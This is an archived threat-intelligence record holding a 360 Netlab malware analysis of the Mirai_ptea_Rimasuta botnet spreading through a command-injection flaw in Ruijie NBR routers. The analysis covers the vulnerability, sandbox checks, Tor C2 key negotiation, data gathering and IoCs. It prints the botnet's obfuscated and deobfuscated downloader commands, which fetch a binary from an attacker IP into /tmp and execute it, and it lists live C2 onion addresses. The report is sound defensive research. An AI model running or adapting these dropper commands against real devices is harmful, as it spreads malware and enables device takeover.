{
    "id": "7172b5fb-97ee-4113-8c43-7fb9b28c1062",
    "created_at": "2023-01-12T15:04:14.519879Z",
    "updated_at": "2025-03-27T02:16:59.216262Z",
    "deleted_at": null,
    "sha1_hash": "16259529c47241accf61bffc1c812a6af1195e27",
    "title": "2021-09-28 - Mirai_ptea_Rimasuta variant is exploiting a new RUIJIE router 0 day to spread",
    "authors": "",
    "file_creation_date": "2022-05-29T01:21:14Z",
    "file_modification_date": "2022-05-29T01:21:14Z",
    "file_size": 857417,
    "plain_text": "# Mirai_ptea_Rimasuta variant is exploiting a new RUIJIE router 0 day to spread\n\n**[blog.netlab.360.com/rimasuta-spread-with-ruijie-0day-en/](https://blog.netlab.360.com/rimasuta-spread-with-ruijie-0day-en/)**\n\nHui Wang September 28, 2021\n\n28 September 2021 / [0-day](https://blog.netlab.360.com/tag/0-day/)\n\n## Overview\n\n[In July 2021 we blogged about Mirai_ptea, a botnet spreading through an undisclosed](https://blog.netlab.360.com/mirai_ptea-botnet-is-exploiting-undisclosed-kguard-dvr-vulnerability-en/)\nvulnerability in KGUARD DVR. At first we thought it was a short-lived botnet that would soon\ndisappear so we just gave it a generic name. But clearly we underestimated the group\nbehind this family, which has in fact been very active and was recently observed to be\n[spreading using a 0day vulnerability in the RUIJIE NBR700 series routers.](https://www.ruijienetworks.com/)\n\nIt is interesting to note that the author included this paragraph in one of the updated samples.\n```\n-_- you guys didnt pick up on the name? really???? its ``RI-MA-SU-TA``. not\nMIRAI_PTEA this is dumb name.\n\n```\nMirai_ptea_Rimasuta now has builtin mechanism to check if the running environment is a\nsandbox, it also encrypts the network traffic to counter the network level detection.\n\n## Timeline\n\n2021-06-10 Note another mirai variant, mirai_aurora, first exploited this RUIJIE\nvulnerability to spread\n2021-09-05 We noticed Mirai_ptea_Rimasuta starting to use exploit\n2021-09-06 We notified the vendor of the vulnerability\n2021-09-09 The vendor confirmed the existence of the vulnerability and informed that it\nhas [stopped maintaining this version of the device, and the manufacturer believes that](https://www.ruijie.com.cn/fw/xw/86338/)\nit can be mitigated by changing the default password, so it does not intend to provide a\nnew patch to fix the vulnerability.\n\n## Vulnerability Analysis\n\n### Vulnerability Type\n\nCommand injection vulnerability\n\n### Vulnerability details\n\n\n-----\n\nTo avoid abuse, we are not disclosing the full details. The description in this section includes\nonly part of the vulnerability exploitation process.\n\nAn interface named `wget_test.asp test exists on the RUJIE router device, which accepts`\nURLs passed in from the page for wget testing (the testing function is eventually\nimplemented through a script named `wget_test.sh ), but it does not perform special`\ncharacter checks on the incoming parameters, leading to command injection. Note: The\ninterface requires login authentication. However, the RUIJIE router has default weak\npassword, so an attacker can combine these 2 factors to launch an attack.\n\nAccording to our investigation, there are still great number of online devices having this\nproblem.\n\nwhere `wget_test.sh reads as follows:`\n```\n#!/bin/sh\nwhile [ 1 ]\ndo\n     wget -O /dev/null $1;\n     sleep 1;\ndone\n\n### Known affected device versions\n\n```\n\n-----\n\n```\nNBR1600GDX9  Release(180516)\nRGNBR700GDX5  Release(180202)\nRGNBR700GDX5  Release(180314)\nRGNBR700GDX9  Release(180720)\nRGNBR700GWDX5 Release(180314)\nRGNBR700GWDX9 Release(180613)\nRGNBR700GWDX9 Release(180720)\nRGNBR700GWDX9 Release(191023)\nRGNBR900GA1C2 Release(170809)\n\n### Exploit payload analysis\n\n```\nSome of the vulnerabilities exploit Payload as follows:\n\nThe content of the file corresponding to the URL in the above image is shown below. At first\nglance, it looks a bit strange because it uses many empty variables( to confuse security\nanalysts?)\n```\nv=.rib;\ncd ${ENrjHs}/t${hSQGxia}mp;\nwg${qyZuBCTFDSMnw}et http://2[.56.244.121/gkTHLPZAAsmP -O ${v};\nchm${mBSVmBhyrCQcZ}od +x ${v};\n./${v};\n\n```\nWhen these variables are removed, its function is intuitive: download the sample and\nexecute it.\n```\nv=.rib;\ncd /tmp;\nwget http://2.56.244.121/gkTHLPZAAsmP -O ${v};\nchmod +x ${v};\n./${v};\n\n## Botnet size\n\n```\n\n-----\n\nFrom our data horizon, the active Bot source IP trends for this botnet are as follows:\n\nBot source IPs are geographically distributed as follows:\n\n## Sample Analysis\n\nThe basic information of the ARM sample is shown as follows.\n```\nMD5:b01b0bc32469f11a47d6e54eef8c7ffb\nELF 32-bit LSB executable, ARM, version 1, statically linked, stripped\nPacker:No\nLib:uclibc\n\n```\n\n-----\n\nMirai_ptea_Rimasuta is a Mirai variant, with redesigned encryption algorithm and C2\ncommunication protocol. In terms of encryption algorithm, Mirai_ptea_Rimasuta uses TEA\nalgorithm instead of Mirai's simple XOR encryption, and a lot of sensitive resource\ninformation such as C2, Tor Proxy, etc have been encrypted; in terms of C2 communication,\nMirai_ptea_Rimasuta uses Tor Proxy to indirectly establish communication with C2. For more\n[details on this part, please refer to our previous Blog, and let’s just look at some changes in](https://blog.netlab.360.com/mirai_ptea-botnet-is-exploiting-undisclosed-kguard-dvr-vulnerability-en/)\nthis active new sample.\n\n### 0x1: TEA key\n\nThis Mirai_ptea_Rimasuta sample hardcod 2 sets of TEA keys, one for encrypting &\ndecrypting sensitive resources and one for encrypting & decrypting network traffic, to\ndistinguish the former we call it Res_teakey and the latter Net_teakey.\n```\nRes_teakey is shown as follows.\n\n```\nPart of the resource information is decrypted as shown below, note the content of index c.\n\n```\nThis WEek on NeTLAb 360 bOTnet oPERATOR lEaRNS CHacha SliDe\n\n```\n```\nindex 0, value = /proc/\nindex 1, value = /exe\nindex 2, value = /fd\nindex 3, value = /proc/net/tcp\nindex 4, value = /cmdline\nindex 5, value = /status\nindex 6, value = /maps\nindex 7, value = /dev\nindex 8, value = /dev/misc\nindex 9, value = /dev/misc/watchdog\nindex a, value = /dev/watchdog\nindex b, value = watchdog\nindex c, value = This WEek on NeTLAb 360 bOTnet oPERATOR lEaRNS CHacha SliDe\n\n```\n(as far as we know, none of us know how to dance chacha…yet…)\n```\nNet_teakey is shown below\n\n```\nIt is not used in practice, it just acts as a placeholder and Mirai_ptea_Rimasuta dynamically\ngenerates a new Net_teakey at runtime, which will be discussed in the Network Protocols\nsection below.\n\n### 0x2: Sandbox detection\n\nA large number of sandboxes or simulators process samples in a fixed path and name them\nwith MD5 or random strings. Mirai_ptea_Rimasuta takes this cue and checks the path &\nfilename of the sample, and only after it meets the requirements will it go ahead and run,\n\n\n-----\n\notherwise it exits.\n\nThe following shows legit \"run paths\"\n```\n./.rib\n/XXriXX\n\n### 0x3: C2 variation\n\n```\nMirai_ptea_Rimasuta uses the following code snippet to get the Tor C2, which shows that the\nC2 table entry in the encrypted resource is 0xD, and there are 6 C2s (random mod 6).\n\nThe encrypted information in 0xD is decrypted as follows.\n```\nindex d, value =\nuf7ejrtdd6vvrsobk6rtsuicwogqyf6g72s55qop2kvpt7r4wfui6fqdwrabajewouypwxdsq4rxn7heb3k53i\n\n```\n\n-----\n\nAfter excluding the .onion at the end of the above string and splitting it by length 56, then\nsplicing it with the .onion string at the end, we get the following 6 C2s, which have a one-toone correspondence with the port of the hard-coded 6 in the sample.\n```\nuf7ejrtdd6vvrsobk6rtsuicwogqyf6g72s55qop2kvpt7r4wfui6fqd.onion:20346\nwrabajewouypwxdsq4rxn7heb3k53ihoogik46ji6o7gj65yeo33reqd.onion:32288\nt5pmcdgiipaznhuexh2usvojfixqzudnizgzeyihsyu7e5rehj7bfkad.onion:17774\nrg7t465nvnnzugdbdqdg3yf2pypssynb4wxavgghb4me2lecnw23ivyd.onion:6000\nvmdm5jrmksizpt6f7trsno6od7xcfs6hzywah46eaju72jkfvqbqdcqd.onion:27644\npnjc66nasxdomwlyqo32d4ft43pooo7s4yuom3gn2gr5bmcpw7lgq4qd.onion:4409\n\n### 0x4: Network protocol change\n\n```\nThe active Mirai_ptea_Rimasuta sample also starts to encrypt the network traffic using the\nTEA algorithm, and although there is a hard-coded set of keys Net_teakey in the sample, it is\nnot used in practice, but a new key dynamically generated through negotiation with the C2s.\n\nThe whole communication process can be divided into 3 steps as follows\n\nStage 1. communication with C2 is established via TOR PROXY\n\nStage 2. TEA key negotiation\n\nStage 3. receive the command from C2, note that the traffic is encrypted at this time\n\nThe focus is on the key negotiation in the second step, we will take the actual data traffic\ngenerated in the following figure as an example, and we will discuss step by step how Bot &\nC2 get the same key.\n\nStage1 is the typical process of establishing communication with TOR C2. Starting from\nStage2, Mirai_ptea_Rimasuta's packets consist of 3 parts: `head(2bytes), hash(4bytes),`\n```\nand content(Nbytes), where the value of head is fixed in a session and the value of hash\n\n```\nis calculated by the hash_calc function for content in the appendix.\n\nThe whole negotiation process is shown as follows.\n\n\n-----\n\n1. Bot randomly generates 12 characters and uses the hash_calc algorithm in the\n\nappendix to get the value of Net_teakey[0]. At this time Bot has Net_teakey[0], C2 does\nnot know the value of task Net_teakey.\n\n2. Bot randomizes 8 characters to form content, uses hash_calc to calculate content to\n\nget hash, and puts the low 16 bits of the hash value into head, then sends this packet\nof 14 bytes long to C2, and finally calculates the whole packet by hash_calc to get\nNet_teakey[2] value, at this time Bot has Net_teakey[0,2] and C2 has Net_teakey[2].\n\n3. C2 returns the packet to Bot, and the value of the hash is used in step\n\n\n-----\n\n4. After receiving the packet back from C2, Bot forms the content with local IP, random\n\ncharacters in step 1, encrypts it using TEA algorithm (Res_teakey is the key),\nconstructs a packet of 32 bytes in length and sends it to C2, where the value of hash is\nNet_teakey[1], and finally calculates the C2 hash from step 3 with its own Bot hash is\ncalculated by hash_calc, to be Net_teakey[3]. At this point, Bot already knows the 4\nvalues in Net_teakey, and the order of acquisition is [0,2,1,3].\n\n5. After C2 receives Bot's packet, it first gets Net_teakey[1], then gets Net_teakey[3] by\n\nhash_calc, and finally decrypts content to get the 12 strings used by Bot in step 1, and\nthen gets Net_teakey[0] by hash_calc. At this point, C2 also knows the 4 values in\nNet_teakey, which are obtained in the order of [2,1,3,0].\n\nAt this point, the negotiation process ends, and the subsequent communication between Bot\n& C2 uses the TEA algorithm to encrypt & decrypt the key for Net_teakey.\n\n### 0x5: Information gathering function\n\nThis active Mirai_ptea_Rimasuta sample monitors the TCP network connections of the\ncompromised device and uploads the connection details that meet specific requirements to\nthe Reporter. we believe that the authors of Mirai_ptea_Rimasuta will rely on this part of its\n\n\n-----\n\ncollected information for his own data mining.\n\nThe specific implementation process can be divided into the following steps.\n\n1. Get the inode information of the current TCP network connection via /proc/net/tcp, as\n\nwell as the state State information of the network connection\n\n2. Get the socket inode from /proc/[pid]/fd, match it with the inode in step 1, and get the\n\ncorresponding process.\n\n3. Get the cmdline information of the process in step 2 from /proc/[pid]/cmdline\n\n4. If the state of the network connection is \"established\" and there is a \"wget\" string in the\n\ncmdline, the cmdline of the process and the remote address & port of the network\ncommunication will be reported to the Reporter.\n\n5. If the State of the network connection is \"listen\" and the local port is one of\n\n\"3451,8888,17872,9137\", and a process has established a connection with this\nprocess, the cmdline of this process and the remote address & port of the network\ncommunication will be reported to Reporter.\n\n6. If the state of the network connection is neither \"established\" nor \"listen\", the cmdline of\n\nthe process and the remote address & port of the network communication will be\nreported to Reporter.\n\nThe following code snippet is used to establish communication with the Reporter, where the\nReporter decrypted the contents and get\n```\ngmfj55g3lvkik3d73euirhjnicny3x32azifmtboqojsglnnifulbzqd.onion .\n\n```\n\n-----\n\n-----\n\nAfter successfully establishing communication with the Reporter, the message to be reported\nis constructed with the following code snippet.\n\nThe actual Report packet generated, and the meaning of the fields, is shown below.\n```\nRAW packet\n00000000: 5A A5 90 D9 F9 37 B4 D6 00 AC 1E 01 09 3A 77 67 Z....7.......:wg\n00000010: 65 74 20 2D 71 20 2D 4F 20 2D 20 68 74 74 70 3A et -q -O - http:\n00000020: 2F 2F 69 63 6D 70 2E 64 76 72 69 6E 73 69 64 65 //icmp.dvrinside\n00000030: 2E 63 6F 6D 3A 39 30 30 30 2F 47 65 74 50 75 62 .com:9000/GetPub\n00000040: 6C 69 63 4E 61 6D 65 20              licName \n---------------------------------------------------------------------------Field parsing\n5A A5 ----> magic, 2bytes\n90 D9 F9 37 ----> remote ip, 4 bytes\nB4 D6 ----> remote port, 2 bytes\n00 ----> hardcode, 1 byte\nAC 1E 01 09 ----> local ip\n3A ----> length of \"cmdline\"\n77 67 ..to end ----> cmdline \n\n## Recommendation\n\n```\nWe recommend RUIJIE router users to check and update the firmware system in time. Set a\ncomplex login password for the Web management interface.\n\n## Suggestions\n\nWe recommend that users check and update their device firmwares in a timely manner, and\ncheck whether there are default accounts that should be disabled.\n\nWe recommend the following IoCs to be monitored and blocked on the networks where it is\napplicable.\n\n\n-----\n\n## Contact us\n\n[Readers are always welcomed to reach us on Twitter or email us to netlab at 360 dot cn.](https://twitter.com/360Netlab)\n\n## IoC\n\n### Downloader\n```\nhttp://2[.56.244.121/tuPuSSbAxXIW\nhttp://2[.56.244.121/gkTHLPZAAsmP\nhttp://2[.56.244.121/VqIXrFxAGpPD\nhttp://2[.56.244.157/qSdYKoxbZakW\nhttp://2[.56.244.157/iZXPWXshhRRt\nhttp://2[.56.244.157/vnlWcwcBunwk\nhttp://2[.56.244.157/IAqecfTrQwQF\nhttp://2[.56.244.157/bwgFHtUOGJcv\nhttp://2[.56.244.121/KaoJHwKMBiAJ\nhttp://2[.56.244.157/yhZyIAclbmhD\nhttp://2[.56.244.157/PszBtRNfnzBO\nhttp://2[.56.244.157/SywXQrWdNIrM\nhttp://2[.56.244.157/awfLWTOmgxTX\nhttp://2[.56.244.157/zEkFejmPQeVR\nhttp://91[.211.91.56/mIoCinspKSkE\nhttp://91[.211.89.242/vkvTxquhFCGV\nhttp://91[.211.88.220/OOGRLHgUnshR\n\n Sample MD5\nb01b0bc32469f11a47d6e54eef8c7ffb\n1a5329dcda994df16e6896f870f04f5e\n344df0446b8b40588ca5e72ad3ef7217\n777792d3df3f1850fa667b4afbb2cfc1\na6ddfec272fbf867a4cf3c154eaf47aa\n904cbd20a5996125f91f9c7c02ca9bbd\n\n C2\nuf7ejrtdd6vvrsobk6rtsuicwogqyf6g72s55qop2kvpt7r4wfui6fqd.onion:20346\nwrabajewouypwxdsq4rxn7heb3k53ihoogik46ji6o7gj65yeo33reqd.onion:32288\nt5pmcdgiipaznhuexh2usvojfixqzudnizgzeyihsyu7e5rehj7bfkad.onion:17774\nrg7t465nvnnzugdbdqdg3yf2pypssynb4wxavgghb4me2lecnw23ivyd.onion:6000\nvmdm5jrmksizpt6f7trsno6od7xcfs6hzywah46eaju72jkfvqbqdcqd.onion:27644\npnjc66nasxdomwlyqo32d4ft43pooo7s4yuom3gn2gr5bmcpw7lgq4qd.onion:4409\n\n Reporter\ngmfj55g3lvkik3d73euirhjnicny3x32azifmtboqojsglnnifulbzqd.onion:6667\ngmfj55g3lvkik3d73euirhjnicny3x32azifmtboqojsglnnifulbzqd.onion:6668\ngmfj55g3lvkik3d73euirhjnicny3x32azifmtboqojsglnnifulbzqd.onion:6669\n\n```\n\n-----\n\n### Appendix\n```\n---------------------------------------------------------------------RAW packet\n#00000048 99 9f 29 9c 9f 99 72 53 4b 7f e9 08 7c 9b     ..)...rS K...|.\n# head   99 9f\n# hash   29 9c 9f 99\n# content  72 53 4b 7f e9 08 7c 9b\n---------------------------------------------------------------------def hash_calc(buf,len):\n  cnt=len>>2\n  cnt2=len&3\n  sum=len\n  for i in range(0,cnt*4,4):\n    tmp=((ord(buf[i+1])<<8)+ord(buf[i])+sum)\n    tmp2=(tmp^(((ord(buf[i+3])<<8)+ord(buf[i+2]))\n<<11)&0xffffffff)^((tmp<<16)&0xffffffff)\n    sum=(tmp2+(tmp2>>11))&0xffffffff\n  if cnt2==3:\n    tmp=((ord(buf[cnt*4+1])<<8) +ord(buf[cnt*4])+sum)&0xffffffff\n    tmp2=tmp^((ord(buf[cnt*4+2])<<18)&0xffffffff)^((tmp<<16)&0xffffffff)\n    sum=(tmp2+(tmp2>>11))&0xffffffff\n  elif cnt2==2:\n    tmp=((ord(buf[cnt*4+1])<<8) +ord(buf[cnt*4])+sum)&0xffffffff\n    sum=(tmp^(tmp<<11)&0xffffffff)+((tmp^(tmp<<11)&0xffffffff)>>17)\n  elif cnt2==1:\n    tmp=(((ord(buf[cnt*4])+sum)<<10)&0xffffffff)^ (ord(buf[cnt*4])+sum) \n    sum=(tmp+(tmp>>1))&0xffffffff\n  else:\n    pass\n  tmp3=(sum^(sum*8)&0xffffffff)+((sum^(8*sum)&0xffffffff)>>5)\n  tmp4=(tmp3^(16*tmp3)&0xffffffff)+((tmp3^(16*tmp3)&0xffffffff)>>17)\n  final=(tmp4^(tmp4<<25)&0xffffffff)+((tmp4^(tmp4<<25)&0xffffffff)>>6)\n  return final&0xffffffff\ncontent='''\n72 53 4b 7f e9 08 7c 9b\n'''.replace(' ', '').replace('\\n','').decode('hex')\nprint hex(hash_calc(content,len(content)))\n\n```\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-09-28 - Mirai_ptea_Rimasuta variant is exploiting a new RUIJIE router 0 day to spread.pdf"
    ],
    "report_names": [
        "2021-09-28 - Mirai_ptea_Rimasuta variant is exploiting a new RUIJIE router 0 day to spread.pdf"
    ],
    "threat_actors": [
        {
            "id": "f9806b99-e392-46f1-9c13-885e376b239f",
            "created_at": "2023-01-06T13:46:39.431871Z",
            "updated_at": "2025-03-27T02:00:03.08926Z",
            "deleted_at": null,
            "main_name": "Watchdog",
            "aliases": [
                "Thief Libra"
            ],
            "source_name": "MISPGALAXY:Watchdog",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673535854,
    "ts_updated_at": 1743041819,
    "ts_creation_date": 1653787274,
    "ts_modification_date": 1653787274,
    "files": {
        "pdf": "https://archive.orkl.eu/16259529c47241accf61bffc1c812a6af1195e27.pdf",
        "text": "https://archive.orkl.eu/16259529c47241accf61bffc1c812a6af1195e27.txt",
        "img": "https://archive.orkl.eu/16259529c47241accf61bffc1c812a6af1195e27.jpg"
    }
}